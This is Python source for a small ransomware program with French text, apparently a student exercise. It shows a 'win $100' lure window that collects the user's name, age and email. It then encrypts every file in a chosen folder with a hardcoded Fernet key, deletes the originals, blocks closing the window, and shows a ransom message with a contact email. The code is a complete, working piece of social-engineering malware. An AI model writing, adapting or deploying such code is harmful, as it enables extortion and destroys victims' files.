import tkinter as tk
import customtkinter as ctk
from tkinter import simpledialog
import os
from tkinter import filedialog
from cryptography.fernet import Fernet
from tkinter import messagebox
from customtkinter import *
import time
from tkinter import ttk
from PIL import Image, ImageTk

chemin = ""

def loading():

    barre_progression = ttk.Progressbar(master=root, mode="determinate")
    barre_progression.place(relx=0.5, rely=0.32, anchor="n")
    barre_progression["maximum"] = 100
    
    barre_progression["value"] = 0
    for i in range(101):
        barre_progression["value"] = i
        root.update_idletasks()  
        time.sleep(0.045)
    barre_progression.place_forget()
    verifier_champs()
def on_closing():
    pass 

def verifier_champs():
    if saisi.get() and saisi2.get() and saisi3.get() and saisi4.get():
        if "@" in saisi4.get():
            crypter_elements()
        else:
            messagebox.showerror("Nooooooo","Utilise un adresse Email valide")
    else:
        messagebox.showerror("Nooooooo","Remplissez tous les champs")

def selectionner_dossier():
    dossier = filedialog.askdirectory()
    if dossier:
        chemin_music = os.path.join(dossier, "")
    return chemin_music
def demander_cle():
    cle = simpledialog.askstring("Clé de récuperation", "Entrez la clé :")
    return cle.encode() if cle else None

CLE_FIXE = b'8Laf4E7-CgWcDd_EhmfZsE6Hf2dZxS-DuEf4N_XcYR0='
  

def crypter_fichier(chemin_fichier):
    with open(chemin_fichier, "rb") as f:
        contenu = f.read()
    crypteur = Fernet(CLE_FIXE)
    contenu_crypte = crypteur.encrypt(contenu)
    with open(chemin_fichier + ".gpe", "wb") as f:
        f.write(contenu_crypte)
    os.remove(chemin_fichier)


def decrypter_fichier(chemin_fichier):
    with open(chemin_fichier, "rb") as f:
        contenu_crypte = f.read()
    decrypteur = Fernet(CLE_FIXE)
    contenu_decrypte = decrypteur.decrypt(contenu_crypte)
    with open(chemin_fichier[:-4], "wb") as f:  
        f.write(contenu_decrypte)
    os.remove(chemin_fichier)

def crypter_elements():
    messagebox.showinfo("Vous devez faire ca", "Selectionnez le dossier que vous voulez conserver votre bordereau.")
    dossier_musique = selectionner_dossier()
    global chemin 
    chemin = dossier_musique
    for fichier in os.listdir(dossier_musique):
        chemin_fichier = os.path.join(dossier_musique, fichier)
        if os.path.isfile(chemin_fichier) and not chemin_fichier.endswith(".gpe"):
            crypter_fichier(chemin_fichier)
    decrypter_button = CTkButton(master=root, text="Recuperer vos donnees",corner_radius=32,fg_color="#4158D0",
                                 hover_color="$C850C0", border_color="#FFCC70",border_width=2, command=decrypter_elements)
    label1 = CTkLabel(frame,font=("Arial",26), text="⚠️⚠️⚠️Attention vos donnees sont attaques⚠️⚠️⚠️ \n Contactez-nous pour recuperer vos donnees ......\n Email: groupe2@gmail.com")
    label1.place(relx=0.5, rely=0.5, anchor="center")
    decrypter_button.place(relx=0.5, rely=0.5, anchor="n")
    crypter_button.place_forget()
    label0.place_forget()
    saisi.place_forget()
    saisi2.place_forget()
    saisi3.place_forget()
    saisi4.place_forget()
    label_p.pack_forget()
    root.title("RANSOMWARE")

def decrypter_elements():
    global chemin
    cle = demander_cle()
    if cle == CLE_FIXE:
        for fichier in os.listdir(chemin):
            chemin_fichier = os.path.join(chemin, fichier)
            if os.path.isfile(chemin_fichier) and chemin_fichier.endswith(".gpe"):
                decrypter_fichier(chemin_fichier)
        root.destroy()
    else:
        messagebox.showerror("Erreur","Pas correct")

root = ctk.CTk()
root.geometry("700x600")
#root.config(bg="white")
set_appearance_mode("light")
root.configure(bg="white")
root.resizable(0,0)
root.title("Application des dollars")
root.protocol("WM_DELETE_WINDOW", on_closing)
frame =CTkFrame(root,border_width=3,width=600, height=200,border_color="#FFCC70",corner_radius=15)
frame.pack(padx=10, pady=10)

saisi = CTkEntry(frame,width=200, height=30,placeholder_text="Surname")
saisi.place(relx=0.1, rely=0.1)
saisi2 = CTkEntry(frame,width=200, height=30,placeholder_text="Name")
saisi2.place(relx=0.5, rely=0.1)
saisi3 = CTkEntry(frame,width=200, height=30,placeholder_text="Age")
saisi3.place(relx=0.1, rely=0.3)
saisi4 = CTkEntry(frame,width=200, height=30,placeholder_text="Email")
saisi4.place(relx=0.5, rely=0.3)

label0 = CTkLabel(frame, text="Reves-tu un jour d'etre un milliardaire? \n Commencez aujourd'hui...",font=("Arial",20))
label0.place(relx=0.5, rely=0.8, anchor="s")



crypter_button = CTkButton(master=root,width=150,height=50, text="Gagnez 100$",corner_radius=25,fg_color="#4158D0",hover_color="$C850C0",
                            font=("Arial",20), border_color="#FFCC70",border_width=2, command=loading)
crypter_button.place(relx=0.5, rely=0.4, anchor="n")

pil_image = Image.open("/home/venuste/Documents/securiteinfo/dollar.png")

image = ImageTk.PhotoImage(pil_image)
label_p = tk.Label(root,width=300,height=200, image=image)
label_p.pack(padx=5, pady=80)

root.mainloop()
